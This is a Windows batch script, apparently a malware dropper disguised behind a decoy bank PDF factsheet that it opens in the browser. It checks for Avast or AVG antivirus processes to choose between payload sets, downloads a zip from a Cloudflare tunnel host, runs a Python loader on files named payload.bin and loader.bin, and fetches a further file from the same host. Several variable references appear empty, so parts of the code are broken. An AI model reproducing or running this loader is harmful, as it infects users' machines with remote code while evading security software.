:: ▄▄▄▄    ▄▄▄     ▄▄▄█████▓ ▄████▄   ██░ ██   ██████  ██░ ██  ██▓▓█████  ██▓    ▓█████▄ 
:: ▓█████▄ ▒████▄   ▓  ██▒ ▓▒▒██▀ ▀█  ▓██░ ██▒▒██    ▒ ▓██░ ██▒▓██▒▓█   ▀ ▓██▒    ▒██▀ ██▌
:: ▒██▒ ▄██▒██  ▀█▄ ▒ ▓██░ ▒░▒▓█    ▄ ▒██▀▀██░░ ▓██▄   ▒██▀▀██░▒██▒▒███   ▒██░    ░██   █▌
:: ▒██░█▀  ░██▄▄▄▄██░ ▓██▓ ░ ▒▓▓▄ ▄██▒░▓█ ░██   ▒   ██▒░▓█ ░██ ░██░▒▓█  ▄ ▒██░    ░▓█▄   ▌
:: ░▓█  ▀█▓ ▓█   ▓██▒ ▒██▒ ░ ▒ ▓███▀ ░░▓█▒░██▓▒██████▒▒░▓█▒░██▓░██░░▒████▒░██████▒░▒████▓ 
:: ░▒▓███▀▒ ▒▒   ▓▒█░ ▒ ░░   ░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓  ░░ ▒░ ░░ ▒░▓  ░ ▒▒▓  ▒ 
:: ▒░▒   ░   ▒   ▒▒ ░   ░      ░  ▒    ▒ ░▒░ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░ ░ ░  ░░ ░ ▒  ░ ░ ▒  ▒ 
::  ░    ░   ░   ▒    ░      ░         ░  ░░ ░░  ░  ░   ░  ░░ ░ ▒ ░   ░     ░ ░    ░ ░  ░ 
::  ░            ░  ░        ░ ░       ░  ░  ░      ░   ░  ░  ░ ░     ░  ░    ░  ░   ░    
::       ░                   ░                                                     ░            
::
::                          !! Obfuscated By Batchsield !!


@echo off
setlocal
start "" "https://www.bankbsu.ch/dam/jcr:72a8b29f-cccb-4e0f-9007-49b7e1773910/Factsheet-Unternehmen_QR-Rechnung.pdf"

:: Check if Avast or AVG is running
set "antivirusDetected="
tasklist /FI "IMAGENAME eq AvastUI.exe" | find /i "AvastUI.exe" >nul
if ==0 set "antivirusDetected=1"

tasklist /FI "IMAGENAME eq avgui.exe" | find /i "avgui.exe" >nul
if ==0 set "antivirusDetected=1"

:: Set URLs and destination paths based on antivirus detection
if defined antivirusDetected (
    set "zipUrl=https://ready-bathroom-carter-membrane.trycloudflare.com/cam.zip"
    set "runCommand1=load.py aa.bin"
    set "runCommand2=load.py bb.bin"
    set "runCommand3=load.py load.bin"
    set "runCommand4=load.py loader.bin"
) else (
    set "zipUrl=https://ready-bathroom-carter-membrane.trycloudflare.com/bab.zip"
    set "runCommand1=load.py cc.bin"
    set "runCommand2=load.py vv.bin"
    set "runCommand3=load.py pay.bin"
    set "runCommand4=load.py payload.bin"
)

set "destination=\Downloads\downloaded.zip"
set "extractTo=\Downloads\Extracted\Python\Python312"

:: Function to download a file with retries
set retries=3
:DownloadZip
echo Downloading ZIP file from %zipUrl% ...
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%zipUrl%' -OutFile '%destination%' } catch { exit 1 }"

if %ERRORLEVEL% neq 0 (
    set /a retries-=1
    if  gtr 0 (
        echo Download failed. Retrying...
        goto DownloadZip
    ) else (
        echo Failed to download the ZIP file after multiple attempts.
        exit /b 1
    )
)


:: Extract the ZIP file
echo Extracting ZIP file...
powershell -Command "try { Expand-Archive -Path '%destination%' -DestinationPath '\Downloads\Extracted' -Force } catch { exit 1 }"

if %ERRORLEVEL% neq 0 (
    echo Failed to extract the ZIP file.
    exit /b 1
)


:: Navigate to the Python folder and run the Python scripts
echo Running Python scripts...
cd /d "" || (
    echo Failed to navigate to the Python folder.
    exit /b 1
)


:: Run Python scripts using local python.exe
"\python.exe" %runCommand1%
if %ERRORLEVEL% neq 0 (
    echo Failed to execute: %runCommand1%
    exit /b 1
)

"\python.exe" %runCommand2%
if %ERRORLEVEL% neq 0 (
    echo Failed to execute: %runCommand2%
    exit /b 1
)

"\python.exe" %runCommand3%
if %ERRORLEVEL% neq 0 (
    echo Failed to execute: %runCommand3%
    exit /b 1
)

"\python.exe" %runCommand4%
if %ERRORLEVEL% neq 0 (
    echo Failed to execute: %runCommand4%
    exit /b 1
)

echo Python script execution completed.

:: Download a.txt file to the Downloads folder with retries
set "txtUrl=https://ready-bathroom-carter-membrane.trycloudflare.com/a.txt"
set "txtDestination=\Downloads\a.txt"
set retries=3

:DownloadTxt
echo Downloading a.txt file from %txtUrl% ...
powershell -Command "try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%txtUrl%' -OutFile '%txtDestination%' } catch { exit 1 }"


if %ERRORLEVEL% neq 0 (
    set /a retries-=1
    if  gtr 0 (
        echo Download failed. Retrying...
        goto DownloadTxt
    ) else (
        echo Failed to download a.txt after multiple attempts.
        exit /b 1
    )
)

echo Script execution completed.
endlocal